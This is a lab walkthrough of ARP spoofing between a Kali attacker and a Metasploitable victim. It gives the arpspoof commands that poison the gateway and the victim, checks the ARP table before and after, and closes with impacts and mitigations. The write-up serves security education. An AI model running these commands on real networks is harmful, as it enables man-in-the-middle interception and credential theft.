# ARP Spoofing — Technical Walkthrough

## 1. Objective
Demonstrate how ARP cache poisoning can redirect traffic through an attacker, enabling interception or manipulation of network traffic between a victim and the gateway.

---

## 2. Lab Context

- **Attacker:** Kali Linux  
- **Victim:** Metasploitable  
- **Network:** 192.168.43.0/24  
- **Tools Used:** arpspoof, arp, ping, Wireshark  

---

## 3. Network Configuration

### Kali Linux (Attacker)
Static IP configuration:

![Kali IP Config](../images/kali-ip-config.png)

### Metasploitable (Victim)
Static IP configuration:

![Metasploitable IP Config](../images/metasploitable-ip-config.png)

Both machines are on the same subnet, which is required for ARP spoofing.

---

## 4. Connectivity Tests

Before launching the attack, the victim verifies connectivity to both the attacker and the gateway:

```bash
ping 192.168.43.230
ping 192.168.43.1

✅ Connectivity is normal
✅ No packet loss
✅ ARP table is clean

5. ARP Table Before Attack
The victim checks its ARP table:

bash
arp -a
Expected output:


✅ Each IP is mapped to its legitimate MAC address
✅ No spoofing detected yet

6. Launching the ARP Spoofing Attack
The attacker uses arpspoof to poison both the victim and the gateway.

Step 1 — Poison the Gateway
bash
sudo arpspoof -t 192.168.43.1 192.168.43.22
Step 2 — Poison the Victim
bash
sudo arpspoof -t 192.168.43.22 192.168.43.1
Execution output:


✅ Kali repeatedly sends forged ARP replies
✅ The victim and gateway now believe Kali’s MAC belongs to each other

7. ARP Table After Attack
On the victim:

bash
arp -a

✅ The gateway IP (192.168.43.1) now resolves to Kali’s MAC
✅ This confirms successful ARP poisoning

All traffic from the victim intended for the gateway now passes through the attacker.

8. Impact of the Attack
Once ARP poisoning succeeds, the attacker can:

Intercept traffic (MITM)

Modify packets

Steal credentials

Inject malicious content

Disrupt communication

This attack exploits the fact that ARP has no authentication and accepts unsolicited replies.

9. Mitigation Strategies
To defend against ARP spoofing:

Dynamic ARP Inspection (DAI)

Static ARP entries for critical systems

Network segmentation (VLANs)

ARP spoofing detection tools

Encrypted protocols (HTTPS, SSH)

10. Conclusion
This lab demonstrates how ARP spoofing manipulates Layer‑2 behavior to redirect traffic through an attacker.
Understanding this attack is essential for securing local networks and preventing man‑in‑the‑middle scenarios.